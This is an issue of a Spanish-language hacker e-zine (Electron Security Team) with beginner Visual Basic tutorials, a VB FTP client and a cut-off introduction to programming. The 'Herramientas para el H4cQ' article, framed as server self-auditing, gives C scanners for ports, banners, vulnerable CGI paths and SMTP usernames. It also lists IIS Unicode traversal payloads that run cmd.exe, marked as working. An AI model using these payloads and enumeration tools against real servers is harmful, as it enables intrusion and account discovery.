Ahora aparecera en  el menu  a tu mano izquierda. Hazle click y ponlo  en el form.
Luego crea tres botones: unos de  play, otro de pause y otro  para stop y  pega el 
siguiente codigo. En el de play haciendole doble click:

MMControl1.DeviceType = "Sequencer" 
MMControl1.FileName = "C:\appz\ss\thefinal.mid" 'directorio donde esta el archivo
MMControl1.Command = "Open"
MMControl1.Command = "Play"

Ahora hazle doble click al boton  y pon lo siguiente:

Private Sub Command3_Click()
  MMControl1.Command = "Stop"
End Sub

Finalmente en el boton de pausa se pone lo siguiente:

Private Sub Command2_Click()
  MMControl1.Command = "Pause"
End Sub

Como notaron, al agregar al form el mmcontrol le habra aparecido en este, y para 
ocultarlo y asi no verlo al ejecutar el programa peguen el siguiente codigo:

Private Sub Form_Load()
MMControl1.Visible = False
End Sub

Ya estamos listos para  ejecutar y  el programa  y escuchar algun  sonido o musica.
Recuerden de cambiar el directorio donde se  encuentra el archivo que  yo puse, por
uno suyo que si  existe  porque sino  no lo van a escuchar. Tambien  podemos  crear
botones para que toquen la  cancion  siguiente o la anterior, por lo que  podriamos
hacer una especie de mulamp con mid o wav.

3. Menu y preguntas de salida.

Vamos ahora  a  hacer  un menu, con  un par de  opciones. Un poco abajo  del boton
de edicion del visual basic, hay un icono que dice "editor de menus". Hazle  click 
y  te aparecera  una  ventana. Escribe "archivo" en el  caption (que es lo que uno
quiere que aparezca en pantalla) y ponle  de  nombre "archi". Al  poner  "ok",  te
aparecera en el form el menu archivo, pero no tendra ninguna opcion mas abajo, por
lo que vuelve al editor de menus, haz  click en siguiente y escribe  en el caption 
"nuevo" y en el nombre "new". Luego  haz click  en el  boton que  tiene una flecha
hacia la derecha, para que este forme parte de "archivo".
Si queremos que al presionar alt+a  o  alt+n nos salgan  las opciones que creamos,
escribe antes del nombre &. O sea, si ponemos &Archivo en el caption, al  ejecutar
el programa y presionas alt+a se nos  aparecera en el menu, en vez  de  tener  que
hacerle click. Ahora cree en el editor de menus una tercera opcion con el  caption
"&salir" y de nombre "exit". Recuerda que tiene que quedar algo asi:

&Archivo
..&nuevo
..&salir

Ahora presiona "Ok" y en el form  hazle click  a "archivo" y luego a "nuevo", para 
poder programar este boton, pero antes crea un textbox en el form.
Ahora pon lo siguiente en el codigo del boton:

Private Sub new_Click()
Text1.Text = ""
End Sub

Supongo que entendieron lo que hicimos?? Bueno, pa los  giles, al hacerle  click en
el menu a "nuevo"; se borrara lo que contenga el  text1, ya que al ejecutar saldra
escrito "text1", por defecto. Ahora anda en el form a archivo y haz click en salir
para poder programar esta opcion. Jugaremos con la salida de esta forma. Al  hacer 
click  en salir, te  preguntara si deseas salir en verdad, con  dos opciones: si o 
no. Asi que si pones si, saldras y si no NO!!!. Veamos el codigo:


Private Sub AS_Click()
Dim Msg, respuesta
Msg = "¿Desea salir?"
respuesta = MsgBox(Msg, vbQuestion + vbYesNo)
Select Case respuesta
Case vbYes
MsgBox "Adios"
End
Case vbNo
MsgBox "No salio"
End Select
End Sub


Como vemos, dependiendo de si una hace  click en  yes o en no, saldremos  o no del 
programa. Esto es muy util a la hora de  guardar cambias si se  trabaja con textos
u otra informacion.

Ahora veamos algunas funciones que son bastantes utiles, como ocultar formularios,
maximizarlos, minimizarlos etc.
En un archivo nuevo crea tres botones: uno  para maximizar, otro  para minimizar y
otro para ocultar. Ahora pega los siguiente en cada boton:


Private Sub maxim_Click()
Form1.WindowState = 2 'el 2 maximiza el form
End Sub

Private Sub min_Click()
Form1.WindowState = 1 'el 1 minimiza el form

End Sub

Private Sub ocu_Click()
Form1.Hide 'se esconde el form
End Sub


Simple, pero es  muy  util en  el  caso de que  keramos hacer algun  screensaver u 
cualquier otro programa.

Veamos ahora como podemos poner el  tiempo en nuestro programa. Para  esto, tenemos
que poner en el form ese reloj "timer" que esta en la barra a mano izquierda. Luego
cree un label y pega el siguiente codigo:

Private Sub Form_Load()
    Timer1.Interval = 1000  'Aca ponemos el intervalo de tiempo
End Sub

Private Sub Timer1_Timer()
    Label1.Caption = Time   ' Asi actualizamos la hora y la pones en el label1
End Sub


Simple, pero provechoso. Vamos a ver algo que tenga que ver mas con la programacion
en si: el famosisimo if-then-else. En un  form nuevo, crea  un boton, y un textbox.
Ahora pega este codigo:


Private Sub Command1_Click()
If Text1.Text = "juan" Then
MsgBox "tu nombre es juan"
Else
MsgBox "tu nombre no es juan"
End If
End Sub

Private Sub Form_Load()
Text1.Text = ""
Command1.Caption = "ok"
End Sub


Al  hacer click  en  salir, te  preguntara si  deseas  salir  en  verdad, con  dos 
opciones: si o Lo que hace  este programa  es que cuando tu  escribes algun nombre
y presionas "ok" te dice que tu nombre no es  juan, pero si  escribes  como nombre  
"juan"  te dice que ese es  tu  nombre. A  algunos les  parecera estupido, pero el 
uso del if-then-else es muy simple y util en la programacion.

Bueno, hasta aca llegamos con este peque~o tutorial, espero que les sea util y ke
los anime a programar en visual basic. Cualquier duda  o sugerencia  o error  que
haya hecho, me la hacen saber a mi mail. Chao y nos vemos.


[=========================([ Electron Security Team ])===========================]



[====([ Shisei Brujo ])====================================================EST-4=]
[====([ Herramientas para el H4cQ ])=========================================#04=]
[===============================================([ shisei_brujo@latinmail.com ])=]


Lo primero, este  no  es  un  curso de programacion, son solo programas que pueden
ayudar  al  trabajo  diario ;) asi  que no se va a explicar como estan echos, sino
solo  lo  que hacen. Para  comenzar  a revisar la seguridad  de nuestro  servidor, 
lo  primero  es  revisar  que  servicios   esta   ofreciendo,  y  ver  cuale s son
realmente necesarios para  dejarlos  abiertos  y  cuales  no. El  primer  programa 
busca  los   puertos  abiertos   en   cierta  maquina. El  programa  e s realmente 
cavernicola,  y   nos   sirve  mas  para  aprender  a   programar que para revisar 
puertos :(  Pero  para  esto  podemos  ocupar excelentes  programas  como  el nmap
( www.insecure.org/nmap/ ).

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <netdb.h>
#include <arpa/inet.h>

main(int argc, char *argv[])
{
  int sock;
  struct sockaddr_in cliente;
  struct servent *Descripcion;
  struct hostent *lookup;
  unsigned long addr;
  int puerto;
  if ((argc) != 2)
  {
    printf("Uso: %s <numero de ip>\n", argv[0]);
    exit(-1);
  }
  if ((addr=inet_addr(argv[1]))==-1)
  {
    printf("No se pudo encontrar %s\n", argv[1]);
    exit(-11);
  }
  if ((lookup = gethostbyaddr((char *) &addr, sizeof(long), AF_INET)) !=NULL)
    printf("Escaneando a %s\n", lookup->h_name);
  else
    printf("Escaneando a %s\n", argv[1]);
  for(puerto=1;puerto<1000;puerto++)
  { 
    if ((sock=socket(AF_INET, SOCK_STREAM, 0)) < 0)
    { 
      printf ("Error al crear Socket.\n");
      exit(-1);
    }
    cliente.sin_family = AF_INET;
    cliente.sin_addr.s_addr = inet_addr(argv[1]);
    cliente.sin_port = htons(puerto);
    bzero(&(cliente.sin_zero), 8);
    Descripcion=getservbyport(htons(puerto), "tcp");
    if ((connect(sock, (struct sockaddr*)&cliente, sizeof(cliente))) > -1)
      printf("Puerto %d %s\n", puerto, (Descripcion==NULL)?
      "Sin registro":Descripcion->s_name);
    close(sock);
  } 
}

Ahora que ya sabemos que puertos tiene abiertos, seria bueno saber que version 
son los servicios que ofrecen determinados puertos, como el ftp o el sendmail.
Con el objetivo de buscar ciertas fallas y arreglarlas ( para que no  se metan 
intrusos ;)

#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>
 
main (int argc, char *argv[])
{
  int sock, flags, lee, cont=0;
  char buff[1024];
  struct sockaddr_in client;
  if(argc!=3)
  {
    printf("Uso: %s <host> <puerto>\n",argv[0]);
    exit(0);
  }
  sock = socket (AF_INET, SOCK_STREAM, 6);
  client.sin_family = AF_INET;
  client.sin_port = htons(atoi(argv[2]));
  client.sin_addr.s_addr = inet_addr(argv[1]);  
  bzero(&(client.sin_zero), 8);
  connect (sock, (struct sockaddr *)&client, sizeof(client));
  flags=fcntl(sock, F_GETFL);
  fcntl(sock, F_SETFL, flags | O_NONBLOCK);
  while(cont<200000)
  {
    lee=read(sock, buff, sizeof(buff));
    if(lee==-1)
      if(errno!=EAGAIN)
        return;
    if(lee==0)
     return;
    if(lee>0)
    {
      printf("%s", buff);
      bzero(buff, 1024);
    }
    cont++;
  }
  close(sock);
}

Ahora para el puerto 80, no se puede  ver la version  con el programa anterior, 
asi que mejor utilizamos el siguiente  programa  que  nos  mostrara  datos  muy 
utiles a la hora de encontrar fallos ;)

#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>

main(int argc, char *argv[])
{
	int sock;
	char buff[1024];
	struct sockaddr_in client;
	if(argc!=2)
	{
		printf("Uso: %s <ip>\n",argv[0]);
		exit(0);
	}
	sock = socket (AF_INET, SOCK_STREAM, 0);    
	client.sin_family = AF_INET;
	client.sin_port = htons(80);               
	client.sin_addr.s_addr = inet_addr(argv[1]);  
	bzero(&(client.sin_zero), 8);
	connect (sock, (struct sockaddr *)&client, sizeof(client));
	send (sock, "HEAD / HTTP/1.0\n\n",17,0);
	recv (sock, buff, sizeof(buff),0);
	printf("\n%s\n", buff);
	close (sock);
	return(0);
}

Y seguimos, ufff! el siguiente programa nos sirve para encontrar bugs conocidos 
en el puerto 80 de nuestro servidor. Ya sea las conocidas fallas del IIS, o del
CGI. o etc, etc. Estos bugs  tienen que  estar guardados  en un archivo  de  la 
forma:

/?PageServices
/cgi-bin/Count.cgi
/cgi-bin/test-cgi
/cgi-bin/perl.exe 
/cgi-bin/jj  
/_vti_inf.html 
/....../config.sys 
/....../etc/hosts 
/cgi-bin/dnewsweb 
/piranha/secure/passwd.php3 
/scripts/cart32.exe/cart32clientlist 
/scripts/c32web.exe/ChangeAdminPassword 
/scripts/dbman/db.cgi?db=invalid-db
/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir+c:\
/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\
/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir+c:\
/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir+c:\
/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\

( estos funcionan ;)
y luego el archivo se lo pasas como parametro al programa.


#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>

main (int argc, char *argv[])
{
  FILE *Archivo;
  char buff[1024], entrada[1024], recivido[20], *resultado;
  struct sockaddr_in client;
  int sock;
  if(argc!=3)
  {
    printf("Uso: %s <ip> <archivo>\n", argv[0]);
    exit(-1);
  }
  if((Archivo=fopen(argv[2], "r"))==NULL)
  {
    printf("Error leyendo archivo %s\n", argv[2]);
    exit(-1);
  }
  while(fscanf(Archivo, "%s", entrada)!=EOF)
  {
    sprintf(buff, "GET %s HTTP/1.0\n\n", entrada);
    if((sock=socket(AF_INET, SOCK_STREAM, 0))<0)
    {
      printf("Error creando socket\n");
      exit(-1);
    }
    client.sin_family=AF_INET;
    client.sin_port=htons(80);
    client.sin_addr.s_addr=inet_addr(argv[1]);
    bzero(&(client.sin_zero), 8);
    if(connect(sock, (struct sockaddr*)&client, sizeof(client))!=0)
    {
      printf("Error conectando\n");
      return;
    }
    send(sock, buff, strlen(buff), 0);
    recv(sock, recivido, sizeof(recivido), 0);
    resultado=strstr(recivido, "200");
    if(resultado!=NULL)
      printf("%s\n", entrada);
    close(sock);
  }
  fclose(Archivo);
}
 
El siguiente programa  trata  de encontrar algunos logins a  traves del puerto
sendmail. a traves del comando "rcpt" es muy util en algunos casos  cuando  el
puerto finger esta cerrado y no  se  tiene idea  de  que  usuarios se  podrian
encontrar en algun servidor.
Igual que  el  programa  anterior, hay  que  tener un  archivo  con nombres de 
usuarios de la forma

test
guest
pedro
admin
ftp

y luego el nombre del archivo se pasa como parametro al programa.


#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>

int main (int argc, char **argv)
{
  struct sockaddr_in server;
  struct hostent *host;
  int sock;
  FILE *Entrada;
  char helo[]="helo mail\r\n";
  char mail[]="mail from: mail@hotmail.com\r\n";
  char rcpt[100];
  char buff[1024];
  char name[1024];

  if(argc!=3)
  {
     printf("\nUso: %s <host> <lista>\n\n", argv[0]);
     exit(0);
  }
  if((host=gethostbyname(argv[1])) == NULL)
  {
    printf ("Error en nombre de host %s\n", argv[1]);
    exit(1);
  }
  if((Entrada = fopen(argv[2], "r")) == NULL)
  {
    printf("Error leyendo %s\n", argv[2]);
    exit(1);
  }
  if((sock=socket (AF_INET, SOCK_STREAM, 0)) == -1)
  {
    printf("Error creando socket");
    exit(1);
  }
  server.sin_family = AF_INET;
  server.sin_port = htons (25);
  server.sin_addr.s_addr = *(u_long *) host->h_addr;
  bzero (&(server.sin_zero), 8);
  
  if(connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr))==-1)
  {
    printf ("Coneccion rechazada\n");
    exit(1);
  }

  send (sock, helo, strlen (helo), 0);
  send (sock, mail, strlen (mail), 0);

  while(fscanf(Entrada, "%s", name)!=EOF)
  {
    bzero(buff, 1024);
    sprintf(rcpt, "rcpt to:%s\r\n",name);
    send(sock, rcpt, strlen (rcpt), 0);
    recv(sock,buff, sizeof(buff),0);
    if((strstr(buff, "Recipient"))!=NULL)
      printf("%s", buff);
  }
  close (sock);
  fclose(Entrada);
}

Finalmente un programa que  nos sirve para  detectar si nos  estan tratando de
hackear, el programa  espera  en  un  puerto determinado, y al momento  de que
traten  de hacer  una  coneccion  envia  un mensaje con la  direccion  ip  del
atacante. El programa no es de  los mejores, y no  garantiza nada, pero  sirve
para ver cuando te esta molestando, y que el cazador pase a cazado ;)

#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define PORT 23
main ()
{ 
  int x, soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
  char buf[1024];
  struct sockaddr_in serv_addr; 
  struct sockaddr_in client_addr;
  if((soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))==-1)
    exit(-1); 
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET; 
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(PORT);
  if((soc_rc=bind(soc_des, (struct sockaddr *)&serv_addr,
  sizeof(serv_addr)))!=0)
    exit(-1); 
  if (fork()!=0)
    exit(0); 
  setpgrp(); 
  signal(SIGHUP, SIG_IGN);
  if (fork()!=0) 
    exit(0);
  if((soc_rc = listen(soc_des, 5))!=0)
    exit(0); 
  while (1) 
  { 
    soc_len = sizeof(client_addr);
    if((soc_cli=accept(soc_des, (struct sockaddr *)&client_addr,&soc_len))<0)
      exit(0); 
    cli_pid = getpid(); 
    if((server_pid= fork())!=0)
    {
      sprintf(buf, "\nhey! nos atacan desde %s",
      inet_ntoa(client_addr.sin_addr));
      execl("/bin/echo", "echo", buf, NULL);
      close(soc_cli);
      exit(0);
    } 
    close(soc_cli);
  }
}

Todos estos programas fueron desarrollados en maquinas con linux, para
compilar:

# gcc -o <nombre ejecutable> <nombre archivo.c>

y luego

#./<nombre ejecutable> <parametros>

Consultas <shisei_brujo@latinmail.com>


[=========================([ Electron Security Team ])===========================]




[====([ bankzide ])========================================================EST-4=]
[====([ Construyendo Un Cliente FTP en Visual Basic ])=======================#05=]
[==========================================================([ bankzide@est.cl ])=]


Hola  de nuevo, aqui bankzide escribiendo para  EST 4. Despues de mucha flojera de
parte  de todos los grupos under chilenos en general, no podemos dejar el trabajo,
mucho IRC  y PHP Nuke y de los articulines, ¿?Por eso nos pusimos las pilas y aqui
vamos. Yo ya he  escrito un articulo de introduccion basica a Visual Basic (VB) en
EST 2, por lo que ahora no escribire la continuacion  del curso, sino que usos que
se le pueden dar a lo aprendido, por lo que en este articulo  no me voi a  parar a
explicar cada detalle de lo que se  este  haciendo. Como  lo habran  notado en  el
titulo, vamos a programar en Windows y para Windows un cliente FTP grafico, bueno,
jeje con opciones limitadas, no pesa  mas de 50kb, pero me quedo bonito xD. Total,
la gracia aqui es que aprendan un poco a interactuar con Internet a traves del VB.
 Bueno, vamos a lo nuestro.

* Para la construccion, personalmente ocupe el VB 6.0 Spanish, por lo k recomiendo
esa version *

Para empezar vamos a ocupar un solo formulario bajo un proyecto Exe estandar. Este
se constituira de:

	- 5 TextBox
	- 3 CommandButtons
	- 1 ListBox
        - 7 Labels
        - Componente Inet (Invisible)

Por ahora, este cliente solo permitira la descarga de archivos desde un FTP hacia
el HD. Tambien permitira elegir la  ubicacion  de descarga y listara los archivos 
remotos. La ubicacion de los objetos  en el Form  es a eleccion  del autor. Los 7
Labels mencionados anteriormente  no  influyen  internamente en el programa, sino 
que son ayuda grafica para el uso de este. Esto se explica mejor si ven el dise~o
que le hize yo al Form (Incluidos en la zine, en el dir /ftpclnt/ esta el .vbp el
unico .frm su .frx y el logo de Est), por  lo  que  no  explicare la construccion
de los labels xD.
	
Los 5 TextBox van a  tener  un  uso  de "variables", ya que adquiriran un valor y 
seran llamados en las ejecuciones, que son "Conectar" y "Nuevo Host". 
Primeramente son 4 los TextBox que usaremos antes  de  Conectar. Si  la  conexion 
esta establecida, el quinto TextBox (txtCopy) sera Enabled = True, en  el cual se
escribira el nombre o directorio  en el  cual el archivo remoto sera  descargado. 
Continuando con los 4 primeros los definiremos de ls siguientes formas:

- txtHost     : Aqui ira el Host de la FTP (IP o Dns)
- txtPuerto   : Por defecto deje puesto el 21 en el "Text", para  cada vez que se
                lodee el programa.
- txtUsuario  : El Username que se le mandara al Host. Si es de  entrada Anonimo,
                escribir "anonymous".
- txtPassword : La Pass. Si es de entrada anonymous, poner  una  casilla  email o 
                dependiendo del  Server,  cualquier  cosa. En  sus  Properties en 
                PasswordChar le puse * , se dan cuenta para que, no?


El componente  Inet es el que  nos abre los protocolos  para "interactuar" con la 
red. Este, aunque en el formulario es  visible, no lo  es  en la  ejecucion. Este
debe ser puesto en  el  Form. Para  acceder  a  Inet,  hay  que  ir a Proyecto ->
Componentes e instalar "Microsoft Internet Transfer Control 6.0". Una  vez puesto
Inet en el Form hay que darle un  nombre. Por  defecto  viene  con  Inet1 y yo lo 
deje asi. En sus  propiedades, hay  que definir ciertas  cosillas. En  AccessType
hay que ponerlo en "1 - icDirect". En  Protocol hay que seleccionar "2 - icFTP" y
en RemotePort  ponerlo en 21, aunque  esto no  influira  ya que el "txtPuerto" le
dara el valor final a eso.
	
El Listbox es un  objeto que nos  mostrara los  archivos que  se encuentran en el 
Host. A este lo llame lstArchivos. Con la ejecucion de  un "Doble Click" sobre el
archivo en el ListBox, este se  descargara  hacia  la  ruta  especificada  en  el 
txtCopy.

Por ultimo, tenemos los 3 CommandButtons :

- cmdConectar  : Este  boton  es  el  que hace practicamente todo a la entrada al 
                 server. Requiere de que los campos de los txt's que llame tengan
                 datos validos, o sino habra error.
- cmdNuevoHost : Este basicamente borra campos para establcer una nueva conexion.
- cmdSalir     : Salida Inmediata del Programa.

        

Ya explicado el uso que se le daran a los objetos, empezare  por explicar todo el
funcionamiento del programa empezando por el boton "cmdConectar". Todo comentario
extra al codigo ira en comentario ' VB.

---------------------------
Inicio Codigo cmdConectar :
---------------------------

-------------------------------------------------------------------------

Private Sub cmdConectar_Click()   
'Solo Un Click

'Aqui dejamos activos estos objetos, ya que solo ahora nos serviran, Obvio.

lstArchivos.Enabled = True
txtCopy.Enabled = True
cmdNuevoHost.Enabled = True

'Aqui al reves que el comentario anterior ya que dejamos inactivos los campos
'que no deberiamos tocar

cmdConectar.Enabled = False
txtHost.Enabled = False
txtPuerto.Enabled = False
txtUsuario.Enabled = False
txtPassword.Enabled = False

On Error GoTo errorhandler    
'Aqui manejamos los errores que se pueden presentar en el proceso
'Llama a la funcion "errorhandler"

Dim varList As Variant        
'Definimos varList como una variable de tipo Variant

  With Inet1  
'Usando Inet1
                
   .URL = txtHost.Text
   .RemotePort = txtPuerto.Text
   .UserName = txtUsuario.Text
   .Password = txtPassword.Text

'Si bien antes habiamos definido el tipo de protocolo y el AccessType, como ven
'aqui igualamos los datos que deberian haber sido ingresados en los respectivos
'TextBox

   .Execute , "DIR"

'El comando "Execute" nos permite tirar comandos propios del Protocolo FTP
      
   varList = .GetChunk(1024)

'La variable varList recibe valor

   subMostrarFiles (varList)

'Mandamos el valor de varList a la funcion subMostrarFiles
  End With

  
errorhandler:
'Aqui deberiamos llegar si se hubiera presentado error
 
Select Case Err.Number
 
  Case 35764        
'Aun ejecuta el ultimo comando
  
 DoEvents
 Resume
 End Select

'Llama a resumir eventos que pudieran estar pegados

End Sub


-------------------------------------------------------------------------

Ahora veremos el codigo de la funcion subMostrarFiles que se llama con el
valor de varList :

-------------------------------------------------------------------------

Public Sub subMostrarFiles(var As Variant)

  Dim strArreglo() As String
  Dim Num As Integer

'Definimos 2 variables nuevas, Num de tipo entera y strArreglo de caracteres

   lstArchivos.Clear   'Limpiamos el ListBox
   
   strArreglo = Split(CStr(var), Chr(13) & Chr(10))

   lstArchivos.AddItem ("../") 'Para subir de directorio en boxes que no sean Unix
   For Num = 0 To UBound(strArreglo)
      lstArchivos.AddItem (strArreglo(Num))
   Next
 
'Un ciclo "For" hasta que llegue al tope de los archivos
'Va agregando Items al lstArchivos   

End Sub

-------------------------------------------------------------------------

Con esto ya deberiamos tener la lista de archivos en el  ListBox. Para iniciar
la descarga, hay que efectuar Doble Click en el ListBox. Vamos ahora al codigo
de esta accion:

-------------------------------------------------------------------------

Private Sub lstArchivos_DblClick()
On Error GoTo errorhandler

Dim arch As String   'Nueva variable arch de tipo caracter

MousePointer = vbHourglass   

'Pusimos el pointer del mouse en el relojito de arena, para simular descarga

With Inet1
If (Left(lstArchivos.Text, 2) = "./" Or Left(lstArchivos.Text, 3) = "../" Or Right(lstArchivos.Text, 1) = "/") Then

'Aqui vemos si se clickeo en ./ o ../ o /, entonces ejecuta cd "el_texto" y despues "DIR" 

   .Execute , "cd " & lstArchivos.Text
   .Execute , "DIR"
   subMostrarFiles (.GetChunk(1024))

'Nueva lista de archivos
   
 Else       'Si el click es en un archivo
    arch = subNomExit
   .Execute , "get " & lstArchivos.Text & " " & arch

'Aqui seria " get el_archivo_clickeado nombre_de_salida

   .Execute , "pwd"  'Forzando error de tranque

   MsgBox "Descarga Completa!"
   End If
End With

MousePointer = vbDefault 'Mouse Normal

errorhandler:
   Select Case Err.Number
   Case 35764        ' Igual ejecuta el ultimo comando
   DoEvents
   Resume
   End Select
End Sub

-------------------------------------------------------------------------

Veamos ahora la funcion subNomExit que es la que  determina el nombre o 
directorio el archivo sera descargado

-------------------------------------------------------------------------

Private Function subNomExit() As String

'Si el texto tiene como "\" en su derecha, entonces agrega al txtCopy.Text, 
'el nombre del archivo en el ListBox

 If Right(txtCopy.Text, 1) = "\" Then
   subNomExit = txtCopy.Text & lstArchivos.Text

'Si tuviera ":", (pj. c: ) le agrega "\" mas el nombre del archivo en el ListBox. 

 ElseIf Right(txtCopy.Text, 1) = ":" Then
   subNomExit = txtCopy.Text & "\" & lstArchivos.Text

'Si no se ha ingresado nada en el txtCopy.Text,  entonces lo  descargara al 
'directorio desde donde se ejecuto el cliente con el nombre correspondiente
'al ListBox

 ElseIf txtCopy.Text = "" Then
   subNomExit = lstArchivos.Text

'Y por ultimo, si no cumple ninguna de las tres anteriores, se decargara al
'dir desde donde se ejecuto el cliente con el nombre puesto en el txtCopy.

 Else
   subNomExit = txtCopy.Text
 End If
 
End Function

-------------------------------------------------------------------------

Codigo cmdNuevoHost:

-------------------------------------------------------------------------

Private Sub cmdNuevoHost_Click()

'Dejamos enabled los objetos necesarios para una nueva conexion

txtHost.Enabled = True
txtPuerto.Enabled = True
txtUsuario.Enabled = True
txtPassword.Enabled = True
cmdConectar.Enabled = True

'Bloqueamos los innesesarios y limpiamos el texto del Password y del 
'txtCopy, como tambien el ListBox

cmdNuevoHost.Enabled = False
lstArchivos.Enabled = False
txtCopy.Enabled = False
txtPassword.Text = ""
txtCopy.Text = ""
lstArchivos.Clear
End Sub

-------------------------------------------------------------------------

Y por ultimo, el codigo mas simple para el boton cmdSalir que lleva a la
salida inmediata del programa:

-------------------------------------------------------------------------

Private Sub cmdSalir_Click()
Unload Me
End
End Sub

-------------------------------------------------------------------------

Ojala que con las explicaciones haya quedado claro  y ojala  que hayan
aprendido el uso de Inet en VB y algunas de sus funciones. Aqui les voi
a pegar el codigo mas ordenado para que lo puedan observar mejor :	

-------------------------------------------------------------------------

Option Explicit

Private Sub cmdConectar_Click()
lstArchivos.Enabled = True
txtCopy.Enabled = True
cmdNuevoHost.Enabled = True
cmdConectar.Enabled = False
txtHost.Enabled = False
txtPuerto.Enabled = False
txtUsuario.Enabled = False
txtPassword.Enabled = False

On Error GoTo errorhandler
Dim varList As Variant

  With Inet1
   .URL = txtHost.Text
   .RemotePort = txtPuerto.Text
   .UserName = txtUsuario.Text
   .Password = txtPassword.Text
   .Execute , "DIR"
      
   varList = .GetChunk(1024)
   subMostrarFiles (varList)
  End With
  
errorhandler:
 Select Case Err.Number
  Case 35764
   DoEvents
   Resume
 End Select
End Sub

Private Sub cmdNuevoHost_Click()
txtHost.Enabled = True
txtPuerto.Enabled = True
txtUsuario.Enabled = True
txtPassword.Enabled = True
cmdConectar.Enabled = True
cmdNuevoHost.Enabled = False
lstArchivos.Enabled = False
txtCopy.Enabled = False
txtPassword.Text = ""
txtCopy.Text = ""
lstArchivos.Clear
End Sub

Private Sub cmdSalir_Click()
Unload Me
End
End Sub

Public Sub subMostrarFiles(var As Variant)

  Dim strArreglo() As String
  Dim Num As Integer
   lstArchivos.Clear
   
   strArreglo = Split(CStr(var), Chr(13) & Chr(10))
   lstArchivos.AddItem ("../")
   For Num = 0 To UBound(strArreglo)
      lstArchivos.AddItem (strArreglo(Num))
   Next
End Sub



Private Sub lstArchivos_DblClick()
On Error GoTo errorhandler

Dim arch As String

MousePointer = vbHourglass

With Inet1
 If (Left(lstArchivos.Text, 2) = "./" Or Left(lstArchivos.Text, 3) = "../" Or Right(lstArchivos.Text, 1) = "/") Then
   
   .Execute , "cd " & lstArchivos.Text
   .Execute , "DIR"
   subMostrarFiles (.GetChunk(1024))
   
 Else
    arch = subNomExit
   .Execute , "get " & lstArchivos.Text & " " & arch
   .Execute , "pwd"
   MsgBox "Descarga Completa!"
   End If
End With

MousePointer = vbDefault

errorhandler:
   Select Case Err.Number
   Case 35764
   DoEvents
   Resume
   End Select
End Sub

Private Function subNomExit() As String

 If Right(txtCopy.Text, 1) = "\" Then
   subNomExit = txtCopy.Text & lstArchivos.Text
 ElseIf Right(txtCopy.Text, 1) = ":" Then
   subNomExit = txtCopy.Text & "\" & lstArchivos.Text
 ElseIf txtCopy.Text = "" Then
   subNomExit = lstArchivos.Text
 Else
   subNomExit = txtCopy.Text
 End If
 
End Function

-------------------------------------------------------------------------

Por ultimo, para los que no tienen el Visual Basic y le quieren hechar una
mirada al trabajo final (compilado en .exe) probablemente estara en la web
(www.est.cl). Para la  ejecucion, si  es  que  no tienen  instalado VB, se 
necesita el  siguiente  archivo "msinet.ocx" que lo  deberian  poner en el 
directorio  System   de   Windows. Probablemente  tambien  incluiremos  el
"msinet.ocx" en la web.

Se despide, bankzide

bankzide@hotmail.com


[=========================([ Electron Security Team ])===========================]




[====([ Reox ])============================================================EST-4=]
[====([ Introduccion a la Programacion ])====================================#06=]
[=======================================================([ maray@inf.utfsm.cl ])=]


Introduccion

Hola, este es el segundo texto que escribo para una e-zine, y con estos pretendo
ayudar tanto a inexpertos, como a gente que ya tenga algun conocimiento, ya  que
nunca esta demas definir conceptos y revisar  los conocimientos  basicos como de
los que tratan mis textos. Mas que de  seguridad  informatica mis textos  son de 
"informatica", ya que no se puede conocer Roma sin tomar algunos de los caminos.

Este articulillo es una breve introduccion a la programacion, la herramienta mas
poderosa dentro de la informatica. Y bla bla bla, y bla bla... vamos  al  grano.

I-. ¿ Algunas preguntas?...

- ¿ Que es un SOFTWARE ?

El instituto Chileno de Computacion e Informatica, lo  define muy acertadamente 
como: "Los Programas que permiten explotar las capacidades  de los  componentes 
fisicos  del  computador. Es  la   parte logica  e  intelectual de  un  sistema 
computacional sin la cual la maquina  fisica es  inutil". Es a final  de cuenta 
lo que hace funcionar logicamente a un momnton de chips de silicio y electrones
parafernalicos.

- Ahh... ¿ Entonces que es un PROGRAMA ?

Son un variadas instrucciones  escritas en un lenguaje  entendible  para el Pc. 
Es un algoritmo representado de tal forma que el monton de  plastico y  silicio
lo interprete.

- Corresto... ¿ Pero... Que es una INSTRUCCION ?

Mira humbertito, cada instruccion es  proceso  basico  que realiza el monton de
mugre al que llamamos Pc. Son  operaciones simples que estan  pre-definidas  en 
el  tarro  mediante   secuencias  electronicas  logicas. Como  por  el  ejemplo,
calcular, leer, borrar, etc. Te quedo claro???

- Si, si... si...

II-. La "fuente" del programa, o programa "fuente"

Las instrucciones, y por ende los  programas, tienen que  estar en  un lenguaje
el cual el tarro las pueda  interpretar, este se  denomina  LENGUAJE MAQUINA, y 
no siempre es el mismo, ya que varia  dependiendo de la  tecnologia usada. Este 
lenguaje es muy engorroso, dificil de recordar y lento  de desarrollar, ya  que 
hay que estructurar todo mediante las instrucciones directas  al Pc. Es por eso
que en  un afan de simplificar la vida de millones de humanos, se  comenzaron a 
crear    ciertas   automatizaciones  de  algunos  procesos  recurrentes  y   se 
estandarizaron otros para lograr  una  convencion. Esta  convencion  permitiria 
desarrollar el algoritmo en un lenguaje mas  intuitivo  y nativo,  con  lo  que 
simplificaria el proceso. A estas  convenciones se le  llamaron  LENGUAJES, los 
cuales mediante un software se convierten en instrucciones  entendibles  por el 
